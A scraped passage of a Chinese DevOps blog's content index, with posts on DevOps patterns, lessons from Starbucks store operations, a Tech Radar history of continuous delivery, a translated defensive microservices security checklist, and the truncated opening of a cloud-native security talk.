#相对应的，每一个模式都有对应的反模式。反模式是一些常见的错误做法，这些做法一定会导致负向的收益。\n反模式的格式如下：\n反模式名称：用来描述模式的正式名称，这个名称描述了该反模式的特征。\n反模式别名：其它方便记忆的其它名称，别名一般包含了某种助记隐喻。\n反模式类别： 同模式类别。\n不良后果： 对反模式产生的不良结果的说明。\n**常见原因：**导致这种反模式的常见原因分析和说明。\n修正模式：采用相应的模式修正。\n相关模式：和该模式相关的其它模式，其它模式也会导致同样的反模式。\n相关反模式：和该模式相关的其它反模式，有可能多个反模式顺序出现。\n**引用：**相关资料的引用。\n案例 #在不同的模式后面，我会采用不同的案例对模式和反模式进行说明。案例包含我过去亲自实践过的项目以及从他人那里听说且经过我详细考证的案例。为了保密起见，相关的企业，项目人员的名字均以其它形式代替。\n采用 DevOps 模式所要达成的目标 #最后，在我正式介绍这些模式的时候，需要先声明一下 DevOps 的目标。那就是：\n\u0026ldquo;通过一系列行之有效的管理实践和技术实践，以消除软件全生命周期的中的浪费，提升软件及其过程的质量、效率和反馈频率。从而使组织能够更好的适应外部的变化。”\n当我在文章中讨论 DevOps 的目标时，指的就是上面这句话。\n我会在后续的文章里把我这 5 年在 DevOps 转型中碰到的经验和陷阱通过模式的方式分享给您。\n首先，让我们从 DevOps 的策略模式开始。\n关于 DevOps 模式 #DevOps 模式的索引在 Github 上开源，地址是https://github.com/wizardbyron/devops_patterns\n欢迎通过 issue 和pull request 提交你的建议。\n你可以通过关注我的公众号了解 DevOps 模式和反模式，也可以加入我的付费知识星球“DevOps 模式” 和所有 DevOps 的实践者共同交流，我将在知识星球中定期回答那些最受关注的问题。\n","date":"May 18, 2019","permalink":"/blog/2019/2019-05-18-about-devops-patterns/","section":"Blogs","summary":"","title":"DevOps 模式 - 采用模式语言讨论 DevOps"},{"content":"某次在星巴克等咖啡的时候，闲来无事开始观察店员的的工作。可能是出于职业习惯，我开始观察和分析星巴克的工作流程。突然发现星巴克的咖啡交付过程很像一个敏捷软件开发团队的交付过程。后来通过进一步观察和细聊，发现星巴克的店面运营是一个 DevOps 运作的榜样。\n如果我们把星巴克的店员们看做是一个开发/运维团队，把咖啡的交付看作软件的交付，把店面的基础设施维护和清洁看作是运维工作。我们就发现了一个很好的 DevOps 学习榜样。\n让我们看看星巴克店面是如何做 DevOps 的。\n星巴克咖啡交付团队的角色组成 #在星巴克里，大家都相互称对方为星伙伴。我个人理解是通过弱化职级称谓提升每个人的责任心。所有的店员分为四个角色：\n店面主管（SS或IC）：负责店面整体的管理。\n收银：负责点单、推荐产品和收款。\n吧台：负责制作饮品。\nCS：负责门店补货，清理桌面。\n店面主管主要负责团队的任务安排，你可以把它当做是 PM 或者 Scrum Master。在一切都井然有序的情况下，他的工作和一般的员工是一样的。只要他发现了临时需要处理的情况，他才会根据店面的资源来安排临时性的工作。\n吧台内部分为三个部分：收银点单区、咖啡制作区、咖啡待取区，如下图所示：\n收银点单区的店员根据客人的需求点单，然后记录到咖啡杯上。\n咖啡制作区的店员会根据杯子上的标记制作饮品。\n制作完成后的咖啡会放到咖啡待取区等客人来取。\n所有的店员都具备所有的技能（全栈工程师），并通过标准化的考试上岗。你会看到在星巴克里有绿色围裙和黑色围裙。黑色围裙的咖啡师是经过考试的，考试合格后会发黑色围裙作为通过认证的标志。\n反思：你的工程师有标准化的技能考试吗？\n星巴克咖啡交付团队的 DevOps 单向工作流 #说到 DevOps，不能不提到\u0026quot;三步工作法\u0026quot;。首先，我们要用到第一步——构建端到端单向工作流——来观察星巴克店面是如何构建单向工作流的。\n我们可以把交付一杯咖啡的流程和软件开发的交付一个用户故事的流程的关系做如下对应：\n需求分析：和客人交流并记录客人对咖啡的需求。\n产品开发：按照需求制作咖啡。\n产品发布：制作完成并通知客人取咖啡。\n基础设施运维：咖啡店面的日常清扫和补货。\n在这个基础上，我们看看一杯咖啡从点单开始，星巴克的持续交付流水线就是它设备的摆放顺序，确保杯子的单一方向流动，避免返工和逆向流动。\n点单：虽然星巴克的咖啡是流水化工业制品。但是也是存在定制的，比如类别、口味、冷热、大小。虽然顾客有需求，但需求控制在一定范围之内(哪些做得到，哪些做不到)并且通过产品价位板告知顾客。\n反思：你的团队能做什么，不能做什么，什么时候做完，你是否对交付成果有信心？这些信心来自哪里？如果没有信心，如何获得信心？\n标记：在点单阶段，收银会把客户的每一个需求记录到杯子上，包括顾客的姓名。星巴克咖啡采取的是“预付费”(先付费再生产)而非“后付费”（先生产再买单）的方式。这些记录是对一杯咖啡需求验收标准的分解。通过杯子大小来控制每个需求点的验收和用量。\n反思：你的团队开发需求时是否把每个验收条件记录下来并且在不同的阶段控制质量和用时？\n制作：每个带着记号的咖啡杯就是一个格式化的需求文档。上面详细的记录了这个顾客的需求，并且这些需求可以验证。每杯咖啡都有标准的验收样例和工序，所以每个店员都知道完成的标准是什么。这样，即便不是点单的店员，看到杯子上的记号，也能做出符合顾客验收条件的咖啡。此外，每个杯子上都会有顾客姓名的标记，以免点错单。\n反思：你的团队需求文档中的信息是否可以做到无解释交接？\n出品：星巴克“完成”的定义是“顾客拿到了咖啡”，而不是“咖啡制作完毕”。如果顾客没有确认拿到的咖啡符合需求，是没有完成的。如果顾客对咖啡不满意，是可以要求重做的。这时候，会由专门的店员负责重新制作咖啡，直到顾客满意为止。\n反思：你的软件开发流程中“完成”的定义是开发完成？测试完成？还是上线发布完成？\n制作区运营：星巴克从点单开始，到制作咖啡过程中所有的设备、物料、卫生等都要每天维护使之保持最佳使用状态。这些基础设施的使用都是高可用且可以按需伸缩的：两个收银机、两台咖啡机——如果一台坏了，有另外一台备份。默认情况下只使用一台，如果到了忙时两台才会同时使用。这一切都要通过星巴克店面的看板信号机制来动态协调。\n反思：你的软件交付基础设施和人员是否具备动态协调的能力？为什么？\n星巴克咖啡交付的看板系统 #当我们构建了单向的价值流之后，来看看星巴克是如何应用 DevOps 第二工作法——构建快速反馈的。\n首先，从上述流程中，我们可以看到星巴克的四个积压队列(Backlog)，分别是：点单队列、待制咖啡队列、制作中咖啡队列、待取咖啡队列。\n这四个队列构成了星巴克咖啡交付的看板系统，每个环节都是一个单独的队列，并且通过不同的看板可视化积压情况。\n点单队列 # 如果你正在点单，收银员会在你犹豫的时候帮你推荐。然后它会记下你姓名，咖啡的类别和定制化的要求。并记录在杯子上，放到待做咖啡队列。\n一般星巴克的店面都会有两个收银台。平常的情况下只有一名星伙伴收银。如果有客户在收银机排队，就是需求分析资源不足的信号，收银台需要补人。收银台补人的原则是把两个人看作一个单位，如果超出了 2.5 个单位。收银台需要再补充另外一个人。如果两个收银还是不够，值班主管会让一个伙伴拿着点单卡(如下图)提前记录客人需要。这样可以节约在收银台前的时候，客人选择和犹豫时耽误的时间。\n这样就避免了点单队列（需求分析）的积压。\n待做咖啡杯队列和饮品制作流水线 # 此时待做咖啡队列就是一个个打上标记的空杯子。当空杯子数量超过5个，吧台里就需要有第二个人参与咖啡的制作，以减少待做队列里的积压。\n简单的说，一杯标准的意式咖啡会包括三个环节：\n制作浓缩咖啡(Espresso)。 制作奶沫。 混合并添加糖浆/冰块等配料。 在这三步中，第一步制作浓缩咖啡是需要等待的，在这期间星伙伴可以选择同时做其它的咖啡、制作奶沫或者增加配料。所以，咖啡不是一杯一杯交付的，而是一批一批交付的。\n这样就减少的咖啡制作（开发）的积压。\n待取咖啡杯队列 # 当咖啡做完后，会加上盖子，咖啡师会根据杯子上的标记呼唤顾客的姓名。如果堆积的咖啡比较多，就会有一名星伙伴在咖啡待取区，通过呼叫客人的名字专门负责向客人交付咖啡。\n这样就减少了咖啡待取区（发布部署）的积压。\n店内外桌面队列 #严格的说，店内的桌面的收拾是定时的。星巴克会有专门的伙伴，定时的来清理店面桌子上的咖啡杯和餐盘。这个角色就是我们之前说的 CS。由于店面内的清洁并不需要及时响应，所以只需要定时批量清洁就可以。\n他们会采用定时器（上图左一胸口夹着的东西）来记录循环时间和需要做的事情，就相当于一个定时任务队列。并且通过把工作任务分类，任务清单可以确保每个步骤没有遗漏。\n反思：你有维护清单吗？是否是定时任务检查的？\n动态的减少各环节积压 #从上文我们看到，任何一个队列的积压都是一个信号，这样的信号系统在使得每个人各司其职，无需主管协调。让店员能够及时的处理积压，无论需求积压(制作咖啡的量)有多大，都保保证稳定的产出。店面主管的作用就是时刻看住这五个队列，是否需要临时进行资源调配：\n顾客队列就是看板，如果待点单的队列很长，就需要补充人员去收银台。\n吧台内每个空的咖啡杯就是看板，如果空着的咖啡杯很长，那就说明需要有人来制作咖啡。\n咖啡待取区也是看板，如果堆积的咖啡很多就需要有人来提示客户取咖啡。\n桌面就是看板，没有人在座位上，且前面堆积了咖啡杯，就需要去清理掉。\n一般来说，星巴克在非高峰时段保持五个店员：\n1~2个店员负责收银\n1~2个店员负责制作咖啡\n1 个店员负责叫顾客取咖啡\n1 个店员负责清理店内的桌面和地面\n星巴克分为上午班和下午班，各8个小时。他们会在高分期安排换班，而且换班有1-2个小时的重叠，这个时间内星巴克的店面最多只有10 个人以应对高峰期的客流。\n星巴克店员每个人都熟悉端到端全部的工作，任何一个人都可以顶替任何一个环节，在单一环节内高效产出。为了避免单一环节工作枯燥，则需要进行轮岗。这样，每个星巴克店员在不同的工作任务中慢慢树立起了整体观念。\n此外，每个人会在8个小时的工作时间内休息2次。并且根据需要可以在4个不同的岗位中轮换。以保证每个人都能对每个步骤的操作熟练。\n反思：你是否制定了相应的轮岗机制让每个团队成员体验不同交付环节的工作？\n星巴克咖啡交付的自动化基础设施 #星巴克的意式咖啡机和别处的咖啡机是不同的：咖啡豆的豆仓、研磨、出品意式浓缩在一台机器上。打奶沫的拉杆也是只有两档：开和关。\n而大多数的意式咖啡机是和磨豆机分离的，制作意式浓缩前需要经历磨粉、压饼、萃取、去渣、冲洗 5 个步骤。相较于传统的咖啡机的磨粉、压饼、控制奶沫虽然缺少了定制性。但针对于大多数非专业的客群，这些标准和固定化的出品已经能满足需求。这样的自动化基础设施可以保证出品的稳定性。\n反思：你是否分析了自己的交付流程的每一个动作？你是否拥有了自动化基础设施来降低技能的门槛并保证稳定的质量？\n星巴克咖啡交付团队的自我学习和改进 #制定目标的时候都有奖励和惩罚，惩罚的内容很简单，就是做最脏最累的工作：按照店面的整洁规范打扫，这被称之为深度清洁。并且不会让惩罚成为一种精神负担和压力。\n反思：你是否可以通过把“提升熟练程度”当做一种替代的考评机制来提升团队成员的专业程度？\n如果你下一次去星巴克，也许能尝试带着 DevOps 的眼睛去发现其中的秘密。\n参考 #星巴克营运岗位体系\n","date":"May 10, 2019","permalink":"/blog/2019/2019-05-10-learn-devops-from-starbucks/","section":"Blogs","summary":"","title":"从星巴克店面运营学习 DevOps"},{"content":"","date":null,"permalink":"/tags/%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98/","section":"Tags","summary":"","title":"持续交付"},{"content":" 本文原文发表于 2019 年 4 月 16 日的 ThoughtWorks 洞见，后经过修改发表到博客上。\n2009 年底，比利时根特举办了第一届 DevOpsDays。ThoughtWorks 的咨询师Chris-Read 作为嘉宾之一，代表 ThoughtWorks 出席了这次活动并带来名为 “持续集成，流水线和部署”的演讲。ThoughtWorks 作为 DevOps 运动最早的见证者和奠基人，并没有意识到这个周末聚会将在接下来 10 年给全球 IT 行业带来的深远影响。\n1 个月后，ThoughtWorks 发布了第一期的技术雷达。作为一个新兴的名词，DevOps 还没有成熟到让令人瞩目的阶段。然而，即便 DevOps 还没有被纳入技术雷达，但与之相关的早期实践和工具都已出现。在接下来的十年中，DevOps 已经成为每期技术雷达不可或缺的一部分。从这个角度上说，技术雷达就是 DevOps 发展的见证者。\nDevOps 和技术雷达都将迎来自己的不愁之年。作为 IT 行业技术的先行指标，技术雷达上面的技术平均领先行业 3 至 5 年。也就是说，出现在技术雷达 采纳和 试用区域的技术，在 3 - 5 年后大概率将成为业界主流。\n作为 DevOps 和技术雷达的粉丝，我想从技术雷达的角度总结 DevOps 的发展历程。该系列文章共分为三篇，分别是：\nDevOps 和持续交付 基础设施即代码和云计算 容器技术和微服务 本文为“DevOps 和技术雷达的十年”系列文章第一篇：DevOps 和 持续交付。\nDevOps #虽然持续集成、构建流水线和持续部署从技术雷达创刊号就存在。但 DevOps 作为一个正式条目进入技术雷达的评估象限是在 2010 年 8月的第三期技术雷达。那时，对 DevOps 的描述是这样的：\nDevOps 是一个新的运动，在寻找可以满足业务需要的快速交付的软件和稳定的生产环境。它拥有两个目标：首先， 让开发和运维的合作更加紧密。其次，在运维流程中应用敏捷实践（协作，自动化，简单化）来处理初始化虚拟机，变更管理和生产环境监控。它包含文化、流程和工具，全部用于支持更好的沟通，快速的交付和反馈以及可预测的产出上。\n半年后，DevOps 运动所引发的影响越来越大。2011 年 1 月，DevOps 作为条目进入了 “试用” 区域。这意味着至少 ThoughtWorks 内部已经全然接受 DevOps 。在这一期的技术雷达中，对 DevOps 的描述做了一些调整：\nDevOps 运动持续让人们关注经常断裂的开发和运维关系。DevOps 提升了开发和运维的合作以及共同的责任。DevOps 在运维过程中应用敏捷实践, 初始化虚拟机，变更管理和生产环境监控并为开发阶段引入了近似生产环境的思维，工具和环境。DevOps 是对一个想对应用发布到生产环境实施持续交付的关键基础。\n就像本文开头说的，作为 IT 技术的先行指标，出现在技术雷达上的技术条目成为业界主流平均领先行业 3 至 5 年。2011年 6月，DevOps 正式进入技术雷达的采纳象限，这就意味着 DevOps 最晚在未来的 5 年中会成为业界的主流。\n2012年 3 月，技术雷达彻底更新了之前对 DevOps 的描述：\n改进开发和 IT 运营的交互和关系让有效的交付生产系统更加稳定和可维护。创建一个 DevOps 文化需要关注团队组织，工作实践，汇报线和激励机制。它会带来对更加快速和安全的交付的共同责任。我们推荐采用 DevOps 是因为是看不到任何无法带来正面收益的情况。\n这也就是说，在2012年，全球的 ThoughtWorker 们就已经认为在未来 DevOps 一定 会带来益处。而 5 年后的 2017 年，北京才举办第一届 DevOpsDays ，标志了 DevOps 在中国发展的元年。\n最初，社区想让 IT 运维敏捷化，但 DevOps 走出了另外一条路。\n持续交付 #我个人一直觉得，如果持续交付在 2009 年 Velocity 大会上出现， DevOps 很有可能不会出现。\n当 Jez Humble 于 2010 年第一次在 DevOpsDays 介绍持续交付的概念之后，持续交付就成为了 DevOps 的核心实践，直到现在。然而，持续交付在一年后才进入技术雷达，且第一次出现在技术雷达上的时候就直接落入了“采纳”环，技术雷达是这么描述持续交付的：\n如果你想知道 \u0026ldquo;敏捷之后会发生什么\u0026rdquo;, 你应该关注持续交付。虽然您的开发流程可能已完全优化, 但您的组织可能需要数周或数月才能将单个更改转化为生产。持续交付的重点是最大限度地实现自动化, 包括作为代码的基础架构、环境管理和部署自动化, 以确保您的系统始终为生产做好准备。它是关于收紧你的反馈循环, 而不是推迟任何东西, 直到结束。持续交付与持续部署不同, 这意味着将每个更改部署到生产环境。连续持续交付不是牛仔表演。它让您对生产环境负责。企业可以选择部署的内容和时间。如果你认为自己已经确定了敏捷开发的目标, 但没有考虑如何实现持续交付, 你真的还没有开始。\n虽然 DevOps 比持续交付提前半年进入了技术雷达，但持续交付这一理念的各个组成部分早在技术雷达的创刊之前就存在了。\n在2010 年 1月的技术雷达创刊号上，“构建流水线”（Build Pipeline）的概念就已经处于技术雷达的“采纳”环内。在持续交付出现之前，构建流水线已经连续 4 期稳坐在技术雷达的“采纳”环内。我们现在可以把构建流水线看做是“持续集成”的一种扩展实践，当时它已经被广泛的运用到了各种开发项目上。\n与此同时，“持续部署”（Continuous Deployement）作为“软件交付最后一公里”的实践，由于风险始终处于“评估”和“试用” 阶段。直到和持续交付同时出现在技术雷达上。彼时，构建流水线、持续部署和持续交付是三个不同的实践。你可以简单的认为“构建流水线 + 持续部署 = 持续交付”，然而，持续交付所涉及的内容却不止涵盖技术层面。《持续交付》一书的作者 Jez Humble 在其博客“持续交付 vs 持续部署” 中详细介绍了其中的区别：\n首先，严格来说，部署并不暗示发布，你可以持续的部署到 UAT 环境。让持续部署变得特别的是把每一个改动都通过自动化测试（或者简短的QA门禁）部署到生产环境。持续不是发布每一个良好构建给用户。这么说来，更准确的叫法应该是“持续发布”。 其次，持续交付是关于把发布计划交给业务，并不是交给 IT 来决策。实现持续交付意味着确定你的软件在整个生命周期内都是可以部署到生产环境上的。任何一个构建都有机会通过自动化的过程被发布给用户。 但是，这并不是说都把每次成功的构建交付给用户是一个好主意。特别是，有些嵌入式产品包括了软件和硬件的变更。在这些情况下，少次变更的感受可能会更好。关键在于，这些发布都是业务驱动的。\n2011 年 6 月份的技术雷达中，持续交付和 DevOps 同时出现在了 的“采纳”象限。严格的说，DevOps 并不是一项技术、也不是一种实践，它是围绕着一个理念的运动。由于 DevOps 缺乏官方的定义，所以 DevOps 可以包含很多内容。但持续交付不同，持续交付通过《持续交付》这本书传播了一套完整和系统的方法论。这套系统的方法论和 DevOps 的理念不谋而合，因此，在 DevOps 社区内被广泛应用。直至今日，持续交付与否仍然是一个组织是否具备 DevOps 能力的一项关键能力。\n换句话说，持续交付可以没有 DevOps，但 DevOps 不能没有持续交付。\n技术雷达判断的没错，《持续交付》不光影响了 DevOps ，也影响了其它软件领域。随着持续交付的盛行，特别是流水线的概念深入人心，在不同领域诞生了不同的持续交付技术。例如：基础设施流水线，镜像构建流水线，移动设备的持续交付\n持续交付和 DevOps 中的反模式 #由于 DevOps 缺乏一个官方标准或者规范，因此对 DevOps 的理解和实践就会有所偏颇。在知道什么是“好的实践”的过程中，我们也需要知道那些“不好的实践”，例如CI 剧场（CI Theatre）：\n长期以来, 我们一直倡导持续集成 (CI), 我们是构建 CI 服务器程序 以自动构建签入项目的先驱。使用得当的情况下, 这些程序作为开发人员每天承诺的共享项目主线上的守护进程运行。Ci 服务器构建项目并运行全面测试, 以确保整个软件系统集成并处于始终可发布的状态, 从而满足持续交付的原则。遗憾的是, 许多开发人员只是设置了一个 CI 服务器, 错误地认为他们正在 \u0026ldquo;做 CI\u0026rdquo;, 而实际上他们错过了所有的好处。\n常见的故障模式包括: 对共享主干运行 CI, 但很少提交。 因此集成并不是真正连续的;运行测试覆盖率较差的生成;允许构建长时间保持红色却不修复; 或对特征分支运行 CI, 从而导致连续隔离。随后的 \u0026ldquo;CI 剧场\u0026rdquo; 可能会让人感觉很好, 但却会让任何可信的 CI 失败。\n此外，很多人在理解持续集成（CI） 的时候，就仅仅以为是安装一个 CI 软件（例如 Jenkins ），然后在上面打包（运行自动化构建）。而忽视了整个 CI 的九项关键原则：\n维护单一代码库 自动化构建 让构建可以自测试 所有提交都要在一台持续集成机器上进行构建 让构建保持快速 在类生产环境上进行测试 让任何人都可以轻松的取得最新的可执行版本 每个人都可以看到发生了什么事情 自动化部署 关于如何正确的做持续集成，可以参考ThoughtWorks 官方的持续集成介绍，进一步了解详情可以查看 Martin Fowler 的原文。\n此外，随着持续集成这项实践被广泛采纳。大型的项目也开始迁移到持续集成服务器上，就会导致 “为所有团队构造单一 CI 实例”：\n我们不得不再次告诫, 不要为所有团队创建一个 CI 实例。虽然在理论上整合和集中持续集成 (CI) 基础结构是一个不错的主意, 但实际上, 我们在这个空间的工具和产品中没有看到足够的成熟度来实现所需的结果。软件交付团队必须定期使用集中式 CI 产品, 这些团队会根据中央团队执行次要配置任务或解决共享基础结构和工具中的问题而长时间的延迟。在这一阶段, 我们继续建议各组织将其集中投资限于建立模式、准则和支持交付团队运行自己的 CI 基础设施。\n然而，随着 CI 不断膨胀使得 CI 管理员不得不拆分流水线和自动化测试，以便使得大型、缓慢的自动化测试能够独立运行。一个代码库被拆成多个代码库。一条流水线被拆成多条流水线。既然能够独立测试、必然能够独立部署。于是，慢慢的也就产生了微服务的概念。关于微服务，我们将在《从技术雷达看DevOps 的十年——Docker和微服务》。\n下面是持续交付和 DevOps 相关条目的发展历程一览图。实线为同一条目的变化，虚线为影响的相关条目：\nDevOps 和持续交付的理念在10年中不断发酵，影响了之后工具和技术的发展，技术雷达捕捉到了这些全球的趋势。让我们从最早开始改变的数据中心和云计算看看 DevOps 带来的影响。\n敬请期待第二篇《从技术雷达看DevOps 的十年——基础设施即代码和云计算》\n相关条目：持续交付，构建流水线，持续部署，基础设施流水线，镜像构建流水线，移动设备的持续交付，Spinnaker。\n","date":"April 16, 2019","permalink":"/blog/2019/2019-04-16-devops-and-techradar-anniversary-devops-and-continous-delivery/","section":"Blogs","summary":"","title":"从技术雷达看 DevOps 的十年——DevOps与持续交付"},{"content":" 本文节选自 Graham Lea 的博客：Microservices Security: All The Questions You Should Be Asking\nGitHub（含中文翻译）地址：https://github.com/wombat-bros-sisters/answers-to-microservices-security-questions\n以下是我的问题列表, 您和您的团队应该向自己询问有关微服务安全性的问题。它旨在用作评估您自己的系统和流程的清单。希望你会发现你已经涵盖了这些问题中的大多数, 但总是有更多的东西需要学习。每个问题之后都有一个相关内容的链接。\n核心服务（Core Services） #(我指的是组成您的系统的服务, 不与互联网或其他外部系统接口)\n您是否只是在互联网边界保护您的系统？(纵深防御) 如果入侵者进入您的核心网络, 您有哪些保护措施？(纵深防御) 网络中的某个人在多大程度上可以轻松地访问您的服务之间的流量？(安全通信) 您的服务之间是不是过于相互信任？或者，你的服务是不是无条件相信高频调用者(您确定只有您自己的服务可以调用您自己的服务吗？)(勉强信任) 当您的服务被调用时, 它是否要求调用方对进行身份验证, 或者它是否允许任何连接请求？(服务认证) 您的服务是让调用者访问服务提供的所有 API, 还是只允许他们访问履行其功能所需的 API？(服务授权) 在客户端发起每个调用请求的人的身份是否会传递到您的内部服务中, 还是在网关中丢失？(当事人传播) 您的服务是否可以相互请求任何数据, 或仅请求授予其权限的用户的数据？(当事人授权) 如果攻击者拥有某个服务, 他们是否可以很容易地从其下游服务中请求任何内容？(当事人授权) 您有什么保证措施从经过身份验证的用户收到的请求没有被篡改？(防篡改) 您如何确保第二次发送的授权请求被检测和拒绝？(重播保护) 是不是每个人都理解 SQL 注入？您有哪些措施来确保没有人编写容易受到 SQL 注入的代码？(SQL 注入) 您是否熟悉所有其他类型的注入, 以及如何预防？(SQL 之外的注入) 您是否掌握了密码存储的最新状态？(密码存储) 您是否意识到, 如果您的密码数据库被盗, 如今简单的撒盐加密是完全无用的？(密码存储) 如果您需要升级密码存储算法, 如何在不对用户造成大规模干扰的情况下进行升级？(密码存储) 如何积极识别数据库中的私有和敏感数据？(私隐提升) 如果您的数据被盗, 您有哪些保护措施来防止最敏感的部分被读取？(私人和敏感数据) 如果您的服务使用的是私钥, 如何保护这些密钥不被入侵者使用？(密钥管理, 千万不要以为您的秘密是安全的) 您知道什么是硬件安全模块 (Hardware Security Module，HSM), 以及何时以及如何使用硬件安全模块吗？(密钥管理) 您有哪些日志记录可用于检测和分析安全漏洞？(安全日志记录/安全信息和事件管理 (Security Information and Event Management ，SIEM)) 中间件（Middleware） #(我指的是您在系统和界面中运行的任何第三方软件。在我的公司里, 目前这主要是我们的数据库和邮件系统, 但它可能包括其他系统, 例如 bpm 和 中间件。这些问题大多也适用于集成的外部软件。\n您是否在所有服务中共享一个数据库登录权限？(最少特权) 您的服务可以访问多少数据？是所有的？还是只有他们必须的？(最少特权) 如果攻击者获得了一个服务的数据库凭据, 他们将获得多少数据？(最少特权) 您的数据库授权策略是否允许更新和删除应用程序仅插入到的表？(最少特权) 您是否在所有服务中共享单个消息传递中间件登录？(最少特权) 您的消息传递中间件是否也有登录凭据？(有些还没有!)(最少特权) 您的服务是否有权访问系统中的所有消息, 还是只能访问他们需要查看的邮件？(最少特权) 您的服务是否可以将消息发送到任何队列, 或仅将消息发送到所需的队列？(最少特权) 如果攻击者掌握了一个消息服务的凭据, 他们可以访问多少数据？(最少特权) 如果攻击者掌握了一个消息服务的凭据, 他们可以启动哪些操作？(最少特权) 如果您使用登录凭据保护数据库和消息, 如何保护凭据？(千万不要以为你的秘密是安全的) 架构中的遗留系统如何使其他服务处于危险之中？(保护最薄弱的环节) 边缘服务（Edge Services） #(我指的是与互联网或其他外部管理的第三方系统接口的服务)\n您是否已将 TLS 实现升级到最新版本？(安全通信) 您是否配置了 TLS 以消除降级和弱密码攻击？(安全通信) 您的员工中谁知道有关 TLS 的所有信息, 以及如何安全地配置 TLS？(安全通信) 如何确保您的内部网站和管理员网址不会意外地打开到互联网上？ 我可以从网关服务的未经身份验证的 api 中获取哪些信息？(枚举) 我有一个破解密码和用户电子邮件的列表。我可以使用您的密码提醒 url 来测试您的系统中的哪些用户吗？(认证) 您的系统其他部分是否过于信任您的网关服务？(勉强信任) 如果您假设您的网关服务已被完全破坏, 您在其他地方会有什么不同的做法？(纵深防御) 如果网关服务被完全破坏, 可以从内存中收集哪些数据？(纵深防御) 如果网关服务被完全破坏, 可以从网络流量中捕获哪些数据？(纵深防御) Web 和其他客户端（Web \u0026amp; Other Clients） #(我指的是您可能会也可能不创作与服务器端系统接口的软件, 很可能是通过 internet)\n您如何帮助您的用户选择更安全的密码？(密码复杂性) 当输入密码错误时, 您会给出什么反馈？它是否可以用来枚举用户帐户？(枚举) 在多次登录尝试失败后, 是否锁定帐户？(认证) 您给攻击者多少机会猜测每个帐户的密码？(账户安全) 当您锁定帐户时, 您会给出哪些反馈？它是否可以用来枚举用户帐户？(枚举) 您是否有密码提醒功能？是否可以使用它来枚举用户帐户？(枚举) 您是否有密码重置功能？是否可以使用它来枚举用户帐户？(枚举) 您是否考虑过您的系统或系统的某些部分是否需要多重身份验证？(枚举) 是否还有人注意到安全和良好的用户体验之间似乎有一场史诗般的战斗？(UX vs 安全) 您熟悉 owasp 十大网络漏洞吗？(网络安全缺陷) 您能说出所有 owasp 十大网络漏洞的名称吗？(网络安全缺陷) 你的团队中的每个人都能说出所有 owasp 前十名的名字吗？(网络安全缺陷) 你团队中的每个人都能解释如何防范所有的 owasp 前十名吗？(网络安全缺陷) 如何确保在用作输出时正确转义每一块用户数据？(xss/输出编码) 如何正确地在输出用户数据的各种不同上下文中获取用户数据？(xss/输出编码) 您如何帮助防止用户因使用 web 应用而受到攻击？ 您的 web 应用设计是否将浏览器视为不安全的环境？(勉强信任) 您的原生移动应用设计是否将设备视为不安全的环境？(勉强信任) 您如何帮助防止用户因使用本机应用而受到攻击？ 您在客户端上存储或缓存哪些数据？您如何保护它？如果有人窃取了这些数据, 会发生什么情况？它需要放在客户端吗？ 人员和过程 #(我指的是开发和操作您的系统的人员, 以及他们用来执行此操作的过程)\n你在做什么来确保安全被嵌入到你的工程团队所做的一切中去？(安全内建) 你如何把共同的安全原则嵌入到每个人的大脑里？(安全原则) 开发过程中明确内置了哪些安全活动？(安全软件开发过程) 您为开发人员、测试人员和操作人员提供哪些安全培训？(安全培训) 技术人员是否只知道漏洞的名称, 还是真的知道如何利用和测试这些漏洞？(安全培训) 您放置了哪些控制, 谁可以访问系统的哪些部分？(访问控制) 您有什么计划定期审查这些控制措施和人们的访问权限的适当性？(访问控制审核) 您发现和修复第三方软件中的漏洞的过程是什么？(漏洞管理) 如何鼓励工程师将时间用于头脑风暴系统中的风险？(风险头脑风暴/\u0026ldquo;风险风暴\u0026rdquo;) 您是否有确保每项新服务都以极大的安全性启动的服务模板？(安全应用程序模板) 让内部员工定期测试系统的安全性的计划是什么？(安全测试) 你有什么计划, 你会多久引进一次外部安全专家, 你将如何选择他们关注的内容？(安全测试) 你在哪些活动中得到了专家的帮助？只是渗透测试？设计和架构评论如何？(安全测试) 您必须进行哪些自动测试来捕获编写漏洞的漏洞？(自动化安全测试) 为了确保安全控制始终到位, 您必须进行哪些自动测试？(自动化安全测试) 你们是否一直在问自己: \u0026ldquo;如果这个控制点失效了怎么办？下一个控制点是什么？ \u0026ldquo;(纵深防御) 最后..\n“ 假设您的网络受到威胁，你的系统的哪些部分会让你深夜加班？”\n","date":"March 22, 2019","permalink":"/blog/2019/2019-03-22-security-questions-for-microservices/","section":"Blogs","summary":"","title":"【翻译】微服务安全：所有应该被问到的问题"},{"content":"","date":null,"permalink":"/tags/%E5%AE%89%E5%85%A8/","section":"Tags","summary":"","title":"安全"},{"content":"","date":null,"permalink":"/tags/beyondcorp/","section":"Tags","summary":"","title":"BeyondCorp"},{"content":"","date":null,"permalink":"/tags/devsecops/","section":"Tags","summary":"","title":"DevSecOps"},{"content":"","date":null,"permalink":"/tags/serverless/","section":"Tags","summary":"","title":"Serverless"},{"content":"云原生的安全挑战 #云环境的安全跟企业内网的安全是不一样的，有可能我做一个网络分段，拔一根网线就安全了，但是云计算是不太一样的。先说一下在 DevOps 的发展历程中安全相关的发展，在 DevOps 运动的早期，你会看家大家是不提安全的，只提合作和自动化。\n怎么样把开发和运维两端能够更快的进行沟通，提出我们的交付效率和问题响应速度，安全仍然只是传统运维上已经有的安全内容，但是并不会单独考虑安全在 DevOps 中的重要性。\n但是你会发现慢慢的随着自动化程度增强，你会觉得这个安全也是实践 DevOps 中的一个瓶颈，你要解决这个问题，我不如把安全放到 DevOps 整个环里面作为重要的一环来考虑，我们会把一些安全的手段自动化加入到 DevOps 流程中。\n像昨天讲到的，我们会把一些扫描放到持续交付流水线里面，我们会在线做一些验证，但是这些所谓的 DevOps 更多的有 DevOps 网站，我们把安全手段通过自动化的方式加入到 DevOps 的反馈环和流水线，这就是 DevSecOps。\n然而，在云原生环境下，我们需要在一个安全的框架下，重新考虑 DevOps，设计DevOps 的人员、场景、使用。通过更多的方式，而不仅仅是自动化的方式，在座有没有做安全的同学？有没有做 DBA 